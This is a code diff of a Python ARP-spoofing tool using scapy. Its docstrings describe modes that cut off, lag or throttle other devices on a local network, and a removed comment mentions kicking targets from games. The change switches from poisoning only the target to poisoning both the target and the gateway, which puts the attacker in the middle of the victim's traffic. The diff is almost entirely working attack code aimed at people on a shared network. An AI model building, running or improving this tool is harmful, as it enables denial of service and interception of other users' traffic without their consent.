@@ -7,11 +7,9 @@ from scapy.all import ARP, Ether, conf, sendp
 
 class ARPSpoofer:
     """
-    WiFi-safe version — only poisons the TARGET's ARP table, never the gateway.
-    This kicks the target from games without rerouting their traffic through
-    our machine (which would lag our own connection on WiFi).
+    Three modes per target device:
 
-    block  — continuous ARP poison, drops target's outbound packets.
+    block  — continuous ARP poison, complete internet cutoff.
     lag    — pulses poison/restore to simulate a lag switch.
              intensity (1-100): higher = longer block bursts = more lag.
     limit  — randomly poisons to simulate packet loss / bandwidth cap.
@@ -46,11 +44,7 @@ class ARPSpoofer:
                gateway_ip: str, gateway_mac: str) -> None:
         """Stop effect and restore ARP tables."""
         self._stop(target_ip)
-        threading.Thread(
-            target=self._restore,
-            args=(target_ip, target_mac, gateway_ip, gateway_mac),
-            daemon=True,
-        ).start()
+        self._restore(target_ip, target_mac, gateway_ip, gateway_mac)
 
     def remove_all(self, devices: list[dict],
                    gateway_ip: str, gateway_mac: str) -> None:
@@ -100,8 +94,7 @@ class ARPSpoofer:
                     if not self._state.get(target_ip, {}).get("running"):
                         break
 
-                self._restore(target_ip, target_mac, gateway_ip, gateway_mac,
-                              count=2, inter=0)
+                self._restore(target_ip, target_mac, gateway_ip, gateway_mac)
                 time.sleep(allow_t)
 
             elif mode == "limit":
@@ -121,32 +114,25 @@ class ARPSpoofer:
 
     def _poison(self, target_ip: str, target_mac: str,
                 gateway_ip: str, gateway_mac: str) -> None:
-        # WiFi-safe: only poison the target, not the gateway.
-        # Poisoning the gateway would redirect the target's traffic to our machine,
-        # flooding our WiFi and kicking us from our own game.
-        ok = self._send(target_mac,
-                        ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
-        if not ok:
+        ok1 = self._send(target_mac,
+                         ARP(op=2, pdst=target_ip,  hwdst=target_mac,  psrc=gateway_ip))
+        ok2 = self._send(gateway_mac,
+                         ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
+        if not ok1 or not ok2:
             with self._lock:
                 if target_ip in self._state:
                     self._state[target_ip]["running"] = False
 
     def _restore(self, target_ip: str, target_mac: str,
-                 gateway_ip: str, gateway_mac: str,
-                 count: int = 10, inter: float = 0.05) -> None:
+                 gateway_ip: str, gateway_mac: str) -> None:
         if not (target_mac and gateway_mac):
             return
-        # Only restore the target's ARP table — we never poisoned the gateway.
-        # Ethernet src must match ARP hwsrc or modern devices reject the packet.
-        try:
-            sendp(
-                Ether(src=gateway_mac, dst=target_mac) /
-                ARP(op=2, pdst=target_ip, hwdst=target_mac,
-                    psrc=gateway_ip, hwsrc=gateway_mac),
-                iface=self._iface, verbose=0, count=count, inter=inter,
-            )
-        except Exception as e:
-            print(f"[spoofer] RESTORE FAILED: {e}")
+        self._send(target_mac,
+                   ARP(op=2, pdst=target_ip,  hwdst=target_mac,
+                       psrc=gateway_ip, hwsrc=gateway_mac), count=4)
+        self._send(gateway_mac,
+                   ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
+                       psrc=target_ip, hwsrc=target_mac),  count=4)
 
     def _send(self, dst_mac: str, arp_pkt,
               count: int = 1) -> bool:
